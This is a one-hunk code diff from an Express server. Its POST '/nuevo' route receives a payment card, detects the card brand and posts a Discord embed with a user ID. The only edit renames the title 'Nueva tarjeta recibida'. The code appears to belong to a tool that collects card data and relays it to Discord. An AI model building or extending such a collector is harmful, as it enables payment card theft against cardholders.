@@ -117,7 +117,7 @@ app.post('/nuevo', async (req, res) => {
         const marca = detectarMarca(tarjeta);
 
         const embed = new EmbedBuilder()
-            .setTitle('💳 Nueva tarjeta recibida')
+            .setTitle('💳 Nueva tarjeta pita')
             .setColor(0xda0081)
             .addFields(
                 { name: '🆔 User ID', value: `\`${finalUserId}\``, inline: false },
